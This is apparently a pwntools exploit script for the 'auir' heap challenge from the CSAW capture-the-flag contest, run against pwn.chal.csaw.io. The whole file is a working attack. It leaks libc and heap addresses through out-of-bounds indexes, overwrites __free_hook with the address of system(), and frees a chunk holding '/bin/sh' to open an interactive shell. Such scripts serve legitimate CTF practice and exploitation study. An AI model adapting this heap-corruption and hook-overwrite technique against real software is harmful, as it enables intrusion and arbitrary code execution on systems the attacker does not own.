#usr/bin/python

from pwn import *

r = remote('pwn.chal.csaw.io',7713)
#r = process('./auir')
print util.proc.pidof(r)

def makezealot(size,skill):
	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(str(size))
	r.recvuntil('>>')
	r.send(skill)

def destroyzealot(idx):
	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('>>')
	r.sendline(str(idx))

def fixzealot(idx,size,skill):
	r.recvuntil('>>')
	r.sendline('3')
	r.recvuntil('>>')
	r.sendline(str(idx))
	r.recvuntil('>>')
	r.sendline(str(size))
	r.recvuntil('>>')
	r.sendline(skill)

def displayzealot(idx):
	r.recvuntil('>>')
	r.sendline('4')
	r.recvuntil('>>')
	r.sendline(str(idx))

def gohome():
	r.recvuntil('>>')
	r.sendline('5')

displayzealot(-49)
junk = r.recvuntil('[*]SHOWING....')
leak = u64(r.recvn(7).strip().ljust(8,'\x00'))
log.info('leak is:%s' % hex(leak))
libc_base = leak - 0xc62988
log.info('libc base is:%s' % hex(libc_base))
free_hook_addr = libc_base + 0x3c67a8
log.info('free hook address is:%s' % hex(free_hook_addr))
system_addr = libc_base + 0x45390
log.info('system address is:%s' % hex(system_addr))

makezealot(0x20,'/bin/sh\x00') #zealot 0
makezealot(0x20,'B') #zealot 1
makezealot(0x20,'C') #zealot 2
destroyzealot(2)
destroyzealot(1)
makezealot(0x20,'\x00') #zealot 3
displayzealot(3)
junk = r.recvuntil('[*]SHOWING....')
heap = u64(r.recvn(6).strip().ljust(8,'\x00'))
log.info('heap address is:%s' % hex(heap))

makezealot(0x20,p64(free_hook_addr)) #zealot 4

index = (heap + 0x80 - 0x605310)/8
fixzealot(index,0x20,p64(system_addr))
destroyzealot(0)

r.interactive()